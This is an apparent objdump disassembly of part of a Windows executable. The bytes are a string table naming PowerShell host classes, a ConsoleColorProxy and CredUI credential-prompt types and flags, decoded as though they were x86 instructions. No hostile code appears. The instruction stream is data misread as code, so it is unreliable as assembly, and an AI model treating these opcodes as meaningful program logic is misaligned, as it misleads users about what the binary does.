  40687b:	48                   	dec    %eax
  40687c:	61                   	popa
  40687d:	6e                   	outsb  %ds:(%esi),(%dx)
  40687e:	64 6c                	fs insb (%dx),%es:(%edi)
  406880:	65 00 4d 61          	add    %cl,%gs:0x61(%ebp)
  406884:	69 6e 4d 6f 64 75 6c 	imul   $0x6c75646f,0x4d(%esi),%ebp
  40688b:	65 55                	gs push %ebp
  40688d:	49                   	dec    %ecx
  40688e:	00 4d 61             	add    %cl,0x61(%ebp)
  406891:	69 6e 4d 6f 64 75 6c 	imul   $0x6c75646f,0x4d(%esi),%ebp
  406898:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  40689c:	6e                   	outsb  %ds:(%esi),(%dx)
  40689d:	73 6f                	jae    0x40690e
  40689f:	6c                   	insb   (%dx),%es:(%edi)
  4068a0:	65 43                	gs inc %ebx
  4068a2:	6f                   	outsl  %ds:(%esi),(%dx)
  4068a3:	6c                   	insb   (%dx),%es:(%edi)
  4068a4:	6f                   	outsl  %ds:(%esi),(%dx)
  4068a5:	72 50                	jb     0x4068f7
  4068a7:	72 6f                	jb     0x406918
  4068a9:	78 79                	js     0x406924
  4068ab:	00 4d 61             	add    %cl,0x61(%ebp)
  4068ae:	69 6e 41 70 70 49 6e 	imul   $0x6e497070,0x41(%esi),%ebp
  4068b5:	74 65                	je     0x40691c
  4068b7:	72 66                	jb     0x40691f
  4068b9:	61                   	popa
  4068ba:	63 65 00             	arpl   %esp,0x0(%ebp)
  4068bd:	4d                   	dec    %ebp
  4068be:	61                   	popa
  4068bf:	69 6e 41 70 70 00 6d 	imul   $0x6d007070,0x41(%esi),%ebp
  4068c6:	73 63                	jae    0x40692b
  4068c8:	6f                   	outsl  %ds:(%esi),(%dx)
  4068c9:	72 6c                	jb     0x406937
  4068cb:	69 62 00 53 79 73 74 	imul   $0x74737953,0x0(%edx),%esp
  4068d2:	65 6d                	gs insl (%dx),%es:(%edi)
  4068d4:	00 4f 62             	add    %cl,0x62(%edi)
  4068d7:	6a 65                	push   $0x65
  4068d9:	63 74 00 56          	arpl   %esi,0x56(%eax,%eax,1)
  4068dd:	61                   	popa
  4068de:	6c                   	insb   (%dx),%es:(%edi)
  4068df:	75 65                	jne    0x406946
  4068e1:	54                   	push   %esp
  4068e2:	79 70                	jns    0x406954
  4068e4:	65 00 45 6e          	add    %al,%gs:0x6e(%ebp)
  4068e8:	75 6d                	jne    0x406957
  4068ea:	00 53 79             	add    %dl,0x79(%ebx)
  4068ed:	73 74                	jae    0x406963
  4068ef:	65 6d                	gs insl (%dx),%es:(%edi)
  4068f1:	2e 4d                	cs dec %ebp
  4068f3:	61                   	popa
  4068f4:	6e                   	outsb  %ds:(%esi),(%dx)
  4068f5:	61                   	popa
  4068f6:	67 65 6d             	gs insl (%dx),%es:(%di)
  4068f9:	65 6e                	outsb  %gs:(%esi),(%dx)
  4068fb:	74 2e                	je     0x40692b
  4068fd:	41                   	inc    %ecx
  4068fe:	75 74                	jne    0x406974
  406900:	6f                   	outsl  %ds:(%esi),(%dx)
  406901:	6d                   	insl   (%dx),%es:(%edi)
  406902:	61                   	popa
  406903:	74 69                	je     0x40696e
  406905:	6f                   	outsl  %ds:(%esi),(%dx)
  406906:	6e                   	outsb  %ds:(%esi),(%dx)
  406907:	00 53 79             	add    %dl,0x79(%ebx)
  40690a:	73 74                	jae    0x406980
  40690c:	65 6d                	gs insl (%dx),%es:(%edi)
  40690e:	2e 4d                	cs dec %ebp
  406910:	61                   	popa
  406911:	6e                   	outsb  %ds:(%esi),(%dx)
  406912:	61                   	popa
  406913:	67 65 6d             	gs insl (%dx),%es:(%di)
  406916:	65 6e                	outsb  %gs:(%esi),(%dx)
  406918:	74 2e                	je     0x406948
  40691a:	41                   	inc    %ecx
  40691b:	75 74                	jne    0x406991
  40691d:	6f                   	outsl  %ds:(%esi),(%dx)
  40691e:	6d                   	insl   (%dx),%es:(%edi)
  40691f:	61                   	popa
  406920:	74 69                	je     0x40698b
  406922:	6f                   	outsl  %ds:(%esi),(%dx)
  406923:	6e                   	outsb  %ds:(%esi),(%dx)
  406924:	2e 48                	cs dec %eax
  406926:	6f                   	outsl  %ds:(%esi),(%dx)
  406927:	73 74                	jae    0x40699d
  406929:	00 50 53             	add    %dl,0x53(%eax)
  40692c:	48                   	dec    %eax
  40692d:	6f                   	outsl  %ds:(%esi),(%dx)
  40692e:	73 74                	jae    0x4069a4
  406930:	52                   	push   %edx
  406931:	61                   	popa
  406932:	77 55                	ja     0x406989
  406934:	73 65                	jae    0x40699b
  406936:	72 49                	jb     0x406981
  406938:	6e                   	outsb  %ds:(%esi),(%dx)
  406939:	74 65                	je     0x4069a0
  40693b:	72 66                	jb     0x4069a3
  40693d:	61                   	popa
  40693e:	63 65 00             	arpl   %esp,0x0(%ebp)
  406941:	53                   	push   %ebx
  406942:	79 73                	jns    0x4069b7
  406944:	74 65                	je     0x4069ab
  406946:	6d                   	insl   (%dx),%es:(%edi)
  406947:	2e 57                	cs push %edi
  406949:	69 6e 64 6f 77 73 2e 	imul   $0x2e73776f,0x64(%esi),%ebp
  406950:	46                   	inc    %esi
  406951:	6f                   	outsl  %ds:(%esi),(%dx)
  406952:	72 6d                	jb     0x4069c1
  406954:	73 00                	jae    0x406956
  406956:	46                   	inc    %esi
  406957:	6f                   	outsl  %ds:(%esi),(%dx)
  406958:	72 6d                	jb     0x4069c7
  40695a:	00 50 53             	add    %dl,0x53(%eax)
  40695d:	48                   	dec    %eax
  40695e:	6f                   	outsl  %ds:(%esi),(%dx)
  40695f:	73 74                	jae    0x4069d5
  406961:	55                   	push   %ebp
  406962:	73 65                	jae    0x4069c9
  406964:	72 49                	jb     0x4069af
  406966:	6e                   	outsb  %ds:(%esi),(%dx)
  406967:	74 65                	je     0x4069ce
  406969:	72 66                	jb     0x4069d1
  40696b:	61                   	popa
  40696c:	63 65 00             	arpl   %esp,0x0(%ebp)
  40696f:	50                   	push   %eax
  406970:	53                   	push   %ebx
  406971:	48                   	dec    %eax
  406972:	6f                   	outsl  %ds:(%esi),(%dx)
  406973:	73 74                	jae    0x4069e9
  406975:	00 53 79             	add    %dl,0x79(%ebx)
  406978:	73 74                	jae    0x4069ee
  40697a:	65 6d                	gs insl (%dx),%es:(%edi)
  40697c:	2e 54                	cs push %esp
  40697e:	65 78 74             	gs js  0x4069f5
  406981:	00 53 74             	add    %dl,0x74(%ebx)
  406984:	72 69                	jb     0x4069ef
  406986:	6e                   	outsb  %ds:(%esi),(%dx)
  406987:	67 42                	addr16 inc %edx
  406989:	75 69                	jne    0x4069f4
  40698b:	6c                   	insb   (%dx),%es:(%edi)
  40698c:	64 65 72 00          	fs gs jb 0x406990
  406990:	43                   	inc    %ebx
  406991:	72 65                	jb     0x4069f8
  406993:	64 55                	fs push %ebp
  406995:	49                   	dec    %ecx
  406996:	50                   	push   %eax
  406997:	72 6f                	jb     0x406a08
  406999:	6d                   	insl   (%dx),%es:(%edi)
  40699a:	70 74                	jo     0x406a10
  40699c:	46                   	inc    %esi
  40699d:	6f                   	outsl  %ds:(%esi),(%dx)
  40699e:	72 43                	jb     0x4069e3
  4069a0:	72 65                	jb     0x406a07
  4069a2:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  4069a5:	74 69                	je     0x406a10
  4069a7:	61                   	popa
  4069a8:	6c                   	insb   (%dx),%es:(%edi)
  4069a9:	73 00                	jae    0x4069ab
  4069ab:	50                   	push   %eax
  4069ac:	53                   	push   %ebx
  4069ad:	43                   	inc    %ebx
  4069ae:	72 65                	jb     0x406a15
  4069b0:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  4069b3:	74 69                	je     0x406a1e
  4069b5:	61                   	popa
  4069b6:	6c                   	insb   (%dx),%es:(%edi)
  4069b7:	54                   	push   %esp
  4069b8:	79 70                	jns    0x406a2a
  4069ba:	65 73 00             	gs jae 0x4069bd
  4069bd:	50                   	push   %eax
  4069be:	53                   	push   %ebx
  4069bf:	43                   	inc    %ebx
  4069c0:	72 65                	jb     0x406a27
  4069c2:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  4069c5:	74 69                	je     0x406a30
  4069c7:	61                   	popa
  4069c8:	6c                   	insb   (%dx),%es:(%edi)
  4069c9:	55                   	push   %ebp
  4069ca:	49                   	dec    %ecx
  4069cb:	4f                   	dec    %edi
  4069cc:	70 74                	jo     0x406a42
  4069ce:	69 6f 6e 73 00 50 72 	imul   $0x72500073,0x6e(%edi),%ebp
  4069d5:	6f                   	outsl  %ds:(%esi),(%dx)
  4069d6:	6d                   	insl   (%dx),%es:(%edi)
  4069d7:	70 74                	jo     0x406a4d
  4069d9:	46                   	inc    %esi
  4069da:	6f                   	outsl  %ds:(%esi),(%dx)
  4069db:	72 50                	jb     0x406a2d
  4069dd:	61                   	popa
  4069de:	73 73                	jae    0x406a53
  4069e0:	77 6f                	ja     0x406a51
  4069e2:	72 64                	jb     0x406a48
  4069e4:	00 2e                	add    %ch,(%esi)
  4069e6:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
  4069ea:	00 63 62             	add    %ah,0x62(%ebx)
  4069ed:	53                   	push   %ebx
  4069ee:	69 7a 65 00 68 77 6e 	imul   $0x6e776800,0x65(%edx),%edi
  4069f5:	64 50                	fs push %eax
  4069f7:	61                   	popa
  4069f8:	72 65                	jb     0x406a5f
  4069fa:	6e                   	outsb  %ds:(%esi),(%dx)
  4069fb:	74 00                	je     0x4069fd
  4069fd:	70 73                	jo     0x406a72
  4069ff:	7a 4d                	jp     0x406a4e
  406a01:	65 73 73             	gs jae 0x406a77
  406a04:	61                   	popa
  406a05:	67 65 54             	addr16 gs push %esp
  406a08:	65 78 74             	gs js  0x406a7f
  406a0b:	00 70 73             	add    %dh,0x73(%eax)
  406a0e:	7a 43                	jp     0x406a53
  406a10:	61                   	popa
  406a11:	70 74                	jo     0x406a87
  406a13:	69 6f 6e 54 65 78 74 	imul   $0x74786554,0x6e(%edi),%ebp
  406a1a:	00 68 62             	add    %ch,0x62(%eax)
  406a1d:	6d                   	insl   (%dx),%es:(%edi)
  406a1e:	42                   	inc    %edx
  406a1f:	61                   	popa
  406a20:	6e                   	outsb  %ds:(%esi),(%dx)
  406a21:	6e                   	outsb  %ds:(%esi),(%dx)
  406a22:	65 72 00             	gs jb  0x406a25
  406a25:	76 61                	jbe    0x406a88
  406a27:	6c                   	insb   (%dx),%es:(%edi)
  406a28:	75 65                	jne    0x406a8f
  406a2a:	5f                   	pop    %edi
  406a2b:	5f                   	pop    %edi
  406a2c:	00 49 4e             	add    %cl,0x4e(%ecx)
  406a2f:	43                   	inc    %ebx
  406a30:	4f                   	dec    %edi
  406a31:	52                   	push   %edx
  406a32:	52                   	push   %edx
  406a33:	45                   	inc    %ebp
  406a34:	43                   	inc    %ebx
  406a35:	54                   	push   %esp
  406a36:	5f                   	pop    %edi
  406a37:	50                   	push   %eax
  406a38:	41                   	inc    %ecx
  406a39:	53                   	push   %ebx
  406a3a:	53                   	push   %ebx
  406a3b:	57                   	push   %edi
  406a3c:	4f                   	dec    %edi
  406a3d:	52                   	push   %edx
  406a3e:	44                   	inc    %esp
  406a3f:	00 44 4f 5f          	add    %al,0x5f(%edi,%ecx,2)
  406a43:	4e                   	dec    %esi
  406a44:	4f                   	dec    %edi
  406a45:	54                   	push   %esp
  406a46:	5f                   	pop    %edi
  406a47:	50                   	push   %eax
  406a48:	45                   	inc    %ebp
  406a49:	52                   	push   %edx
  406a4a:	53                   	push   %ebx
  406a4b:	49                   	dec    %ecx
  406a4c:	53                   	push   %ebx
  406a4d:	54                   	push   %esp
  406a4e:	00 52 45             	add    %dl,0x45(%edx)
  406a51:	51                   	push   %ecx
  406a52:	55                   	push   %ebp
  406a53:	45                   	inc    %ebp
  406a54:	53                   	push   %ebx
  406a55:	54                   	push   %esp
  406a56:	5f                   	pop    %edi
  406a57:	41                   	inc    %ecx
  406a58:	44                   	inc    %esp
  406a59:	4d                   	dec    %ebp
  406a5a:	49                   	dec    %ecx
  406a5b:	4e                   	dec    %esi
  406a5c:	49                   	dec    %ecx
  406a5d:	53                   	push   %ebx
  406a5e:	54                   	push   %esp
  406a5f:	52                   	push   %edx
  406a60:	41                   	inc    %ecx
  406a61:	54                   	push   %esp
  406a62:	4f                   	dec    %edi
  406a63:	52                   	push   %edx
  406a64:	00 45 58             	add    %al,0x58(%ebp)
  406a67:	43                   	inc    %ebx
  406a68:	4c                   	dec    %esp
  406a69:	55                   	push   %ebp
  406a6a:	44                   	inc    %esp
  406a6b:	45                   	inc    %ebp
  406a6c:	5f                   	pop    %edi
  406a6d:	43                   	inc    %ebx
  406a6e:	45                   	inc    %ebp
  406a6f:	52                   	push   %edx
  406a70:	54                   	push   %esp
  406a71:	49                   	dec    %ecx
  406a72:	46                   	inc    %esi
  406a73:	49                   	dec    %ecx
  406a74:	43                   	inc    %ebx
  406a75:	41                   	inc    %ecx
  406a76:	54                   	push   %esp
  406a77:	45                   	inc    %ebp
  406a78:	53                   	push   %ebx
  406a79:	00 52 45             	add    %dl,0x45(%edx)
  406a7c:	51                   	push   %ecx
  406a7d:	55                   	push   %ebp
  406a7e:	49                   	dec    %ecx
  406a7f:	52                   	push   %edx
  406a80:	45                   	inc    %ebp
  406a81:	5f                   	pop    %edi
  406a82:	43                   	inc    %ebx
  406a83:	45                   	inc    %ebp
  406a84:	52                   	push   %edx
  406a85:	54                   	push   %esp
  406a86:	49                   	dec    %ecx
  406a87:	46                   	inc    %esi
  406a88:	49                   	dec    %ecx
  406a89:	43                   	inc    %ebx
  406a8a:	41                   	inc    %ecx
  406a8b:	54                   	push   %esp
  406a8c:	45                   	inc    %ebp
  406a8d:	00 53 48             	add    %dl,0x48(%ebx)
  406a90:	4f                   	dec    %edi
  406a91:	57                   	push   %edi
  406a92:	5f                   	pop    %edi
  406a93:	53                   	push   %ebx
  406a94:	41                   	inc    %ecx
  406a95:	56                   	push   %esi
  406a96:	45                   	inc    %ebp
  406a97:	5f                   	pop    %edi
  406a98:	43                   	inc    %ebx
  406a99:	48                   	dec    %eax
  406a9a:	45                   	inc    %ebp
  406a9b:	43                   	inc    %ebx
  406a9c:	4b                   	dec    %ebx
  406a9d:	5f                   	pop    %edi
  406a9e:	42                   	inc    %edx
  406a9f:	4f                   	dec    %edi
  406aa0:	58                   	pop    %eax
  406aa1:	00 41 4c             	add    %al,0x4c(%ecx)
  406aa4:	57                   	push   %edi
  406aa5:	41                   	inc    %ecx
  406aa6:	59                   	pop    %ecx
  406aa7:	53                   	push   %ebx
  406aa8:	5f                   	pop    %edi
  406aa9:	53                   	push   %ebx
  406aaa:	48                   	dec    %eax
  406aab:	4f                   	dec    %edi
  406aac:	57                   	push   %edi
  406aad:	5f                   	pop    %edi
  406aae:	55                   	push   %ebp
  406aaf:	49                   	dec    %ecx
  406ab0:	00 52 45             	add    %dl,0x45(%edx)
  406ab3:	51                   	push   %ecx
  406ab4:	55                   	push   %ebp
  406ab5:	49                   	dec    %ecx
  406ab6:	52                   	push   %edx
  406ab7:	45                   	inc    %ebp
  406ab8:	5f                   	pop    %edi
  406ab9:	53                   	push   %ebx
  406aba:	4d                   	dec    %ebp
  406abb:	41                   	inc    %ecx
  406abc:	52                   	push   %edx
  406abd:	54                   	push   %esp
  406abe:	43                   	inc    %ebx
  406abf:	41                   	inc    %ecx
  406ac0:	52                   	push   %edx
  406ac1:	44                   	inc    %esp
  406ac2:	00 50 41             	add    %dl,0x41(%eax)
  406ac5:	53                   	push   %ebx
  406ac6:	53                   	push   %ebx
  406ac7:	57                   	push   %edi
  406ac8:	4f                   	dec    %edi
  406ac9:	52                   	push   %edx
  406aca:	44                   	inc    %esp
  406acb:	5f                   	pop    %edi
  406acc:	4f                   	dec    %edi
  406acd:	4e                   	dec    %esi
  406ace:	4c                   	dec    %esp
  406acf:	59                   	pop    %ecx
  406ad0:	5f                   	pop    %edi
  406ad1:	4f                   	dec    %edi
  406ad2:	4b                   	dec    %ebx
  406ad3:	00 56 41             	add    %dl,0x41(%esi)
  406ad6:	4c                   	dec    %esp
  406ad7:	49                   	dec    %ecx
  406ad8:	44                   	inc    %esp
  406ad9:	41                   	inc    %ecx
  406ada:	54                   	push   %esp
  406adb:	45                   	inc    %ebp
  406adc:	5f                   	pop    %edi
  406add:	55                   	push   %ebp
  406ade:	53                   	push   %ebx
  406adf:	45                   	inc    %ebp
  406ae0:	52                   	push   %edx
  406ae1:	4e                   	dec    %esi
  406ae2:	41                   	inc    %ecx
  406ae3:	4d                   	dec    %ebp
  406ae4:	45                   	inc    %ebp
  406ae5:	00 43 4f             	add    %al,0x4f(%ebx)
  406ae8:	4d                   	dec    %ebp
  406ae9:	50                   	push   %eax
  406aea:	4c                   	dec    %esp
  406aeb:	45                   	inc    %ebp
  406aec:	54                   	push   %esp
  406aed:	45                   	inc    %ebp
  406aee:	5f                   	pop    %edi
  406aef:	55                   	push   %ebp
  406af0:	53                   	push   %ebx
  406af1:	45                   	inc    %ebp
  406af2:	52                   	push   %edx
  406af3:	4e                   	dec    %esi
  406af4:	41                   	inc    %ecx
  406af5:	4d                   	dec    %ebp
  406af6:	45                   	inc    %ebp
  406af7:	00 50 45             	add    %dl,0x45(%eax)
  406afa:	52                   	push   %edx
  406afb:	53                   	push   %ebx
  406afc:	49                   	dec    %ecx
  406afd:	53                   	push   %ebx
  406afe:	54                   	push   %esp
  406aff:	00 53 45             	add    %dl,0x45(%ebx)
  406b02:	52                   	push   %edx
  406b03:	56                   	push   %esi
  406b04:	45                   	inc    %ebp
  406b05:	52                   	push   %edx
  406b06:	5f                   	pop    %edi
  406b07:	43                   	inc    %ebx
  406b08:	52                   	push   %edx
  406b09:	45                   	inc    %ebp
  406b0a:	44                   	inc    %esp
  406b0b:	45                   	inc    %ebp
  406b0c:	4e                   	dec    %esi
  406b0d:	54                   	push   %esp
  406b0e:	49                   	dec    %ecx
  406b0f:	41                   	inc    %ecx
  406b10:	4c                   	dec    %esp
  406b11:	00 45 58             	add    %al,0x58(%ebp)
  406b14:	50                   	push   %eax
  406b15:	45                   	inc    %ebp
  406b16:	43                   	inc    %ebx
  406b17:	54                   	push   %esp
  406b18:	5f                   	pop    %edi
  406b19:	43                   	inc    %ebx
  406b1a:	4f                   	dec    %edi
  406b1b:	4e                   	dec    %esi
  406b1c:	46                   	inc    %esi
  406b1d:	49                   	dec    %ecx
  406b1e:	52                   	push   %edx
  406b1f:	4d                   	dec    %ebp
  406b20:	41                   	inc    %ecx
  406b21:	54                   	push   %esp
  406b22:	49                   	dec    %ecx
  406b23:	4f                   	dec    %edi
  406b24:	4e                   	dec    %esi
  406b25:	00 47 45             	add    %al,0x45(%edi)
  406b28:	4e                   	dec    %esi
  406b29:	45                   	inc    %ebp
  406b2a:	52                   	push   %edx
  406b2b:	49                   	dec    %ecx
  406b2c:	43                   	inc    %ebx
  406b2d:	5f                   	pop    %edi
  406b2e:	43                   	inc    %ebx
  406b2f:	52                   	push   %edx
  406b30:	45                   	inc    %ebp
  406b31:	44                   	inc    %esp
  406b32:	45                   	inc    %ebp
  406b33:	4e                   	dec    %esi
  406b34:	54                   	push   %esp
  406b35:	49                   	dec    %ecx
  406b36:	41                   	inc    %ecx
  406b37:	4c                   	dec    %esp
  406b38:	53                   	push   %ebx
  406b39:	00 55 53             	add    %dl,0x53(%ebp)
  406b3c:	45                   	inc    %ebp
  406b3d:	52                   	push   %edx
  406b3e:	4e                   	dec    %esi
  406b3f:	41                   	inc    %ecx
  406b40:	4d                   	dec    %ebp
  406b41:	45                   	inc    %ebp
  406b42:	5f                   	pop    %edi
  406b43:	54                   	push   %esp
  406b44:	41                   	inc    %ecx
  406b45:	52                   	push   %edx
  406b46:	47                   	inc    %edi
  406b47:	45                   	inc    %ebp
  406b48:	54                   	push   %esp
  406b49:	5f                   	pop    %edi
  406b4a:	43                   	inc    %ebx
  406b4b:	52                   	push   %edx
  406b4c:	45                   	inc    %ebp
  406b4d:	44                   	inc    %esp
  406b4e:	45                   	inc    %ebp
  406b4f:	4e                   	dec    %esi
  406b50:	54                   	push   %esp
  406b51:	49                   	dec    %ecx
  406b52:	41                   	inc    %ecx
  406b53:	4c                   	dec    %esp
  406b54:	53                   	push   %ebx
  406b55:	00 4b 45             	add    %cl,0x45(%ebx)
  406b58:	45                   	inc    %ebp
  406b59:	50                   	push   %eax
  406b5a:	5f                   	pop    %edi
  406b5b:	55                   	push   %ebp
  406b5c:	53                   	push   %ebx
  406b5d:	45                   	inc    %ebp
  406b5e:	52                   	push   %edx
  406b5f:	4e                   	dec    %esi
  406b60:	41                   	inc    %ecx
  406b61:	4d                   	dec    %ebp
  406b62:	45                   	inc    %ebp
  406b63:	00 4e 4f             	add    %cl,0x4f(%esi)
  406b66:	5f                   	pop    %edi
  406b67:	45                   	inc    %ebp
  406b68:	52                   	push   %edx
  406b69:	52                   	push   %edx
  406b6a:	4f                   	dec    %edi
  406b6b:	52                   	push   %edx
  406b6c:	00 45 52             	add    %al,0x52(%ebp)
  406b6f:	52                   	push   %edx
  406b70:	4f                   	dec    %edi
  406b71:	52                   	push   %edx
  406b72:	5f                   	pop    %edi
  406b73:	43                   	inc    %ebx
  406b74:	41                   	inc    %ecx
  406b75:	4e                   	dec    %esi
  406b76:	43                   	inc    %ebx
  406b77:	45                   	inc    %ebp
  406b78:	4c                   	dec    %esp
  406b79:	4c                   	dec    %esp
  406b7a:	45                   	inc    %ebp
  406b7b:	44                   	inc    %esp
  406b7c:	00 45 52             	add    %al,0x52(%ebp)
  406b7f:	52                   	push   %edx
  406b80:	4f                   	dec    %edi
  406b81:	52                   	push   %edx
  406b82:	5f                   	pop    %edi
  406b83:	4e                   	dec    %esi
  406b84:	4f                   	dec    %edi
  406b85:	5f                   	pop    %edi
  406b86:	53                   	push   %ebx
  406b87:	55                   	push   %ebp
  406b88:	43                   	inc    %ebx
  406b89:	48                   	dec    %eax
  406b8a:	5f                   	pop    %edi
  406b8b:	4c                   	dec    %esp
  406b8c:	4f                   	dec    %edi
  406b8d:	47                   	inc    %edi
  406b8e:	4f                   	dec    %edi
  406b8f:	4e                   	dec    %esi
  406b90:	5f                   	pop    %edi
  406b91:	53                   	push   %ebx
  406b92:	45                   	inc    %ebp
  406b93:	53                   	push   %ebx
  406b94:	53                   	push   %ebx
  406b95:	49                   	dec    %ecx
  406b96:	4f                   	dec    %edi
  406b97:	4e                   	dec    %esi
  406b98:	00 45 52             	add    %al,0x52(%ebp)
  406b9b:	52                   	push   %edx
  406b9c:	4f                   	dec    %edi
  406b9d:	52                   	push   %edx
  406b9e:	5f                   	pop    %edi
  406b9f:	4e                   	dec    %esi
  406ba0:	4f                   	dec    %edi
  406ba1:	54                   	push   %esp
  406ba2:	5f                   	pop    %edi
  406ba3:	46                   	inc    %esi
  406ba4:	4f                   	dec    %edi
  406ba5:	55                   	push   %ebp
  406ba6:	4e                   	dec    %esi
  406ba7:	44                   	inc    %esp
  406ba8:	00 45 52             	add    %al,0x52(%ebp)
  406bab:	52                   	push   %edx
  406bac:	4f                   	dec    %edi
  406bad:	52                   	push   %edx
  406bae:	5f                   	pop    %edi
  406baf:	49                   	dec    %ecx
  406bb0:	4e                   	dec    %esi
  406bb1:	56                   	push   %esi
  406bb2:	41                   	inc    %ecx
  406bb3:	4c                   	dec    %esp
  406bb4:	49                   	dec    %ecx
  406bb5:	44                   	inc    %esp
  406bb6:	5f                   	pop    %edi
  406bb7:	41                   	inc    %ecx
  406bb8:	43                   	inc    %ebx
  406bb9:	43                   	inc    %ebx
  406bba:	4f                   	dec    %edi
  406bbb:	55                   	push   %ebp
  406bbc:	4e                   	dec    %esi
  406bbd:	54                   	push   %esp
  406bbe:	5f                   	pop    %edi
  406bbf:	4e                   	dec    %esi
  406bc0:	41                   	inc    %ecx
  406bc1:	4d                   	dec    %ebp
  406bc2:	45                   	inc    %ebp
  406bc3:	00 45 52             	add    %al,0x52(%ebp)
  406bc6:	52                   	push   %edx
  406bc7:	4f                   	dec    %edi
  406bc8:	52                   	push   %edx
  406bc9:	5f                   	pop    %edi
  406bca:	49                   	dec    %ecx
  406bcb:	4e                   	dec    %esi
  406bcc:	53                   	push   %ebx
  406bcd:	55                   	push   %ebp
  406bce:	46                   	inc    %esi
  406bcf:	46                   	inc    %esi
  406bd0:	49                   	dec    %ecx
  406bd1:	43                   	inc    %ebx
  406bd2:	49                   	dec    %ecx
  406bd3:	45                   	inc    %ebp
  406bd4:	4e                   	dec    %esi
  406bd5:	54                   	push   %esp
  406bd6:	5f                   	pop    %edi
  406bd7:	42                   	inc    %edx
  406bd8:	55                   	push   %ebp
  406bd9:	46                   	inc    %esi
  406bda:	46                   	inc    %esi
  406bdb:	45                   	inc    %ebp
  406bdc:	52                   	push   %edx
  406bdd:	00 45 52             	add    %al,0x52(%ebp)
  406be0:	52                   	push   %edx
  406be1:	4f                   	dec    %edi
  406be2:	52                   	push   %edx
  406be3:	5f                   	pop    %edi
  406be4:	49                   	dec    %ecx
  406be5:	4e                   	dec    %esi
  406be6:	56                   	push   %esi
  406be7:	41                   	inc    %ecx
  406be8:	4c                   	dec    %esp
  406be9:	49                   	dec    %ecx
  406bea:	44                   	inc    %esp
  406beb:	5f                   	pop    %edi
  406bec:	50                   	push   %eax
  406bed:	41                   	inc    %ecx
  406bee:	52                   	push   %edx
  406bef:	41                   	inc    %ecx
  406bf0:	4d                   	dec    %ebp
  406bf1:	45                   	inc    %ebp
  406bf2:	54                   	push   %esp
  406bf3:	45                   	inc    %ebp
  406bf4:	52                   	push   %edx
  406bf5:	00 45 52             	add    %al,0x52(%ebp)
  406bf8:	52                   	push   %edx
  406bf9:	4f                   	dec    %edi
  406bfa:	52                   	push   %edx
  406bfb:	5f                   	pop    %edi
  406bfc:	49                   	dec    %ecx
  406bfd:	4e                   	dec    %esi
  406bfe:	56                   	push   %esi
  406bff:	41                   	inc    %ecx
  406c00:	4c                   	dec    %esp
  406c01:	49                   	dec    %ecx
  406c02:	44                   	inc    %esp
  406c03:	5f                   	pop    %edi
  406c04:	46                   	inc    %esi
  406c05:	4c                   	dec    %esp
  406c06:	41                   	inc    %ecx
  406c07:	47                   	inc    %edi
  406c08:	53                   	push   %ebx
  406c09:	00 55 73             	add    %dl,0x73(%ebp)
  406c0c:	65 72 00             	gs jb  0x406c0f
  406c0f:	50                   	push   %eax
  406c10:	61                   	popa
  406c11:	73 73                	jae    0x406c86
  406c13:	77 6f                	ja     0x406c84
  406c15:	72 64                	jb     0x406c7b
  406c17:	00 44 6f 6d          	add    %al,0x6d(%edi,%ebp,2)
  406c1b:	61                   	popa
  406c1c:	69 6e 00 43 6f 6e 73 	imul   $0x736e6f43,0x0(%esi),%ebp
  406c23:	6f                   	outsl  %ds:(%esi),(%dx)
  406c24:	6c                   	insb   (%dx),%es:(%edi)
  406c25:	65 43                	gs inc %ebx
  406c27:	6f                   	outsl  %ds:(%esi),(%dx)
  406c28:	6c                   	insb   (%dx),%es:(%edi)
  406c29:	6f                   	outsl  %ds:(%esi),(%dx)
  406c2a:	72 00                	jb     0x406c2c
  406c2c:	47                   	inc    %edi
  406c2d:	55                   	push   %ebp
  406c2e:	49                   	dec    %ecx
  406c2f:	42                   	inc    %edx
  406c30:	61                   	popa
  406c31:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  406c34:	72 6f                	jb     0x406ca5
  406c36:	75 6e                	jne    0x406ca6
  406c38:	64 43                	fs inc %ebx
  406c3a:	6f                   	outsl  %ds:(%esi),(%dx)
  406c3b:	6c                   	insb   (%dx),%es:(%edi)
  406c3c:	6f                   	outsl  %ds:(%esi),(%dx)
  406c3d:	72 00                	jb     0x406c3f
  406c3f:	47                   	inc    %edi
  406c40:	55                   	push   %ebp
  406c41:	49                   	dec    %ecx
  406c42:	46                   	inc    %esi
  406c43:	6f                   	outsl  %ds:(%esi),(%dx)
  406c44:	72 65                	jb     0x406cab
  406c46:	67 72 6f             	addr16 jb 0x406cb8
  406c49:	75 6e                	jne    0x406cb9
  406c4b:	64 43                	fs inc %ebx
  406c4d:	6f                   	outsl  %ds:(%esi),(%dx)
  406c4e:	6c                   	insb   (%dx),%es:(%edi)
  406c4f:	6f                   	outsl  %ds:(%esi),(%dx)
  406c50:	72 00                	jb     0x406c52
  406c52:	67 65 74 5f          	addr16 gs je 0x406cb5
  406c56:	42                   	inc    %edx
  406c57:	61                   	popa
  406c58:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  406c5b:	72 6f                	jb     0x406ccc
  406c5d:	75 6e                	jne    0x406ccd
  406c5f:	64 43                	fs inc %ebx
  406c61:	6f                   	outsl  %ds:(%esi),(%dx)
  406c62:	6c                   	insb   (%dx),%es:(%edi)
  406c63:	6f                   	outsl  %ds:(%esi),(%dx)
  406c64:	72 00                	jb     0x406c66
  406c66:	73 65                	jae    0x406ccd
  406c68:	74 5f                	je     0x406cc9
  406c6a:	42                   	inc    %edx
  406c6b:	61                   	popa
  406c6c:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  406c6f:	72 6f                	jb     0x406ce0
  406c71:	75 6e                	jne    0x406ce1
  406c73:	64 43                	fs inc %ebx
  406c75:	6f                   	outsl  %ds:(%esi),(%dx)
  406c76:	6c                   	insb   (%dx),%es:(%edi)
  406c77:	6f                   	outsl  %ds:(%esi),(%dx)
  406c78:	72 00                	jb     0x406c7a
  406c7a:	53                   	push   %ebx
  406c7b:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  406c82:	5f                   	pop    %edi
  406c83:	42                   	inc    %edx
  406c84:	75 66                	jne    0x406cec
  406c86:	66 65 72 53          	data16 gs jb 0x406cdd
  406c8a:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
